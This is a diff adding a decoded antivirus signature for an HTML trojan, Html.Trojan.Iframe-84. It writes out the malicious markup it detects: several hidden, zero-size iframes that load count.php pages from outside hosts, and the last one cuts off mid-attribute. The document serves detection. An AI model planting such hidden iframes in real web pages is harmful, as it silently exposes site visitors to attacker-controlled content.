@@ -1,0 +1,5 @@
+VIRUS NAME: Html.Trojan.Iframe-84
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+<iframe src="http://msn-analytics.net/count.php?o=2" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe><iframe src="http://pinoc.org/count.php?o=2" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe><iframe src="http://wsxhost.net/count.php?o=2" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe><iframe src="http://wsxhost.net/count.php?o=2" width=0 height=0 style="hidden
